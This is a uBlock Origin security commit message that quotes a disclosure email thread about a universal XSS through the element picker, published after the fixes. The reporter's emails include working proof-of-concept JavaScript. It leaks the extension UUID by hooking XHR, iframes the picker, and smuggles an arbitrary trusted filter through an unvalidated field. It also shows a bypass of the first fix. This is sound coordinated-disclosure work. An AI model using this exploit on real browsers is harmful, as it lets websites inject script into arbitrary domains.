commit.message:
[security] "Universal XSS from website-driven element picker"

Vulnerability reported through email on Nov. 1st, 2026.

Email subject: "Universal XSS from website-driven element picker"

Related commits, chronological order, from older to most recent:

- "Avoid use of potentially tainted XHR methods in scriptlets"
  https://github.com/gorhill/uBlock/commit/bf69cf7405d7d9e7e4bd1143726988a482629b18
  Published in 1.75.2, November 2, 2026
- "Launch element picker only with a verified secret token"
  https://github.com/gorhill/uBlock/commit/9859477ebc647352282ddd71b5013ce4764493ed
  Published in 1.75.4, November 3, 2026
- "Validate about to be created filter in element picker"
  https://github.com/gorhill/uBlock/commit/b1f7d27c876658a8e148240a401288f462bca788
  Published in 1.76.0, November 8, 2026
- "Prevent war:-related filters for the time being"
  https://github.com/gorhill/uBlock/commit/150df125fd0130bf35050f16bf494194015eecf0
  Published in 1.76.0, November 8, 2026

Email exchange, inside "=====" delimiters:

=====

Should be fixed in 1.75.4 which is now live on AMO.

On 2026-11-02 15:31, [syvb] wrote:
> You can still get the extension UUID by defining a responseText getter
> on the XHR prototype:
>
> Object.defineProperty(
>    XMLHttpRequest.prototype, 'responseText', {
>      get() {
>        mount(/^moz-extension:\/\/[^/]+/.exec(this.responseURL)[0]);
>      }});
>
> (demo https://lootdest.pages.dev/new-demo )
>
> (Also I think it might be possible to bypass the fix when uBO injects
> into an iframe late if the page can race to do it first? I can't
> consistently reproduce this though)
>
> Thanks
> syvb
>
> On Mon, Nov 2, 2026 at 4:23 PM Raymond Hill
> <ubo-security@raymondhill.net> wrote:
>> Clever, thanks for reporting.
>>
>> I committed a fix[1] but I rather not provide details about the
>> vulnerability since
>> I can't publish a stable release version immediately, though hopefully
>> it will not be
>> too long in the future. Once the fix is published in a stable release, I
>> will do a
>> `git commit --amend` to add the details of the issue as provided in your
>> email.
>>
>> [1]
>> https://github.com/gorhill/uBlock/commit/bf69cf7405d7d9e7e4bd1143726988a482629b18
>>
>> On 2026-11-01 22:11, [syvb] wrote:
>>> For the Firefox MV2 extension, it’s possible for a webpage to iframe
>>> the element picker and control it to add arbitrary trusted filters
>>> when a user clicks on the webpage, if there’s a filter rule with a
>>> prevent-xhr or prevent-fetch scriptlet that fulfills the response with
>>> a WAR.
>>>
>>> The attacker website can hook XHR like this to extract the extension
>>> UUID (and the long WAR secret on MV2 Chromium):
>>>
>>> |const open = XMLHttpRequest.prototype.open;
>>> XMLHttpRequest.prototype.open = function(m, url, ...a) { const e =
>>> /^moz-extension:\/\/[^/]+/.exec(url); if (e) {
>>> XMLHttpRequest.prototype.open = open; mount(e[0]); } return
>>> open.call(this, m, url, ...a); }; |
>>>
>>> Then you can use that to iframe the element picker, and send messages
>>> to it to show it and set the filter:
>>>
>>> |const f = document.getElementById("f"); // <iframe> in the page
>>> function mount(origin) { const shown = '||example.com
>>> <http://example.com>^'; const opt = 'image\n' +
>>> String.raw`google.com##+js(trusted-rpnt
>>> <http://google.com##+js(trusted-rpnt>, script, /^[\s\S]*$/,
>>> alert('injected on '+document.domain))`; f.onload = () => { const t =
>>> setInterval(() => { const ch = new MessageChannel();
>>> ch.port1.onmessage = ({ data }) => { if (data.what === 'start') {
>>> clearInterval(t); ch.port1.postMessage({ what: 'showDialog', url:
>>> 'https://example.com/', netFilters: [shown], cosmeticFilters: [],
>>> filter: { filters: [shown], slot: 0 } }); } else if (data.what ===
>>> 'dialogSetFilter') { ch.port1.postMessage({ what: 'resultsetDetails',
>>> count: 1, opt }); } }; f.contentWindow.postMessage({ what:
>>> 'epickerStart' }, '*', [ch.port2]); }, 250); }; f.src =
>>> `${origin}/web_accessible_resources/epicker-ui.html`; } |
>>>
>>> And then run|fetch('/adsbygoogle.js').catch(() => {});|(or whatever
>>> endpoint is affected by the prevent-xhr rule) to trigger all of that.
>>> Also as shown above you can make it so the actual filter added and the
>>> displayed filter are different, by smuggling a second filter into the
>>> opt field (which is supposed to just be the filter type but isn't
>>> validated because random websites aren't supposed to talk to the
>>> element picker).
>>>
>>> I made a full example at https://lootdest.pages.dev/demo
>>> <https://lootdest.pages.dev/demo>(firefox only, and takes a few
>>> seconds to load) which uses the |lootdest.*##+js(no-fetch-if,
>>> adsbygoogle, war:googlesyndication_adsbygoogle.js)|rule in uAssets. If
>>> you want to test this on other domains you can add|*##+js(prevent-xhr,
>>> leakme, war:noop.js)|as a custom filter.
>>>
>>> In that demo you can see the button that gets clicked, but websites
>>> could overlay stuff on top of the embedded element picker or make it
>>> invisible by setting the iframe opacity. Really as long as the website
>>> can get the user to click anywhere, it can add arbitrary trusted
>>> filters for arbitrary domains. Filters added by the element picker are
>>> always treated as trusted (at least until a recompile), which is why
>>> it can add a trusted filter.
>>>
>>> Thanks! Let me know if you have any questions.
>>> syvb
>>>

=====
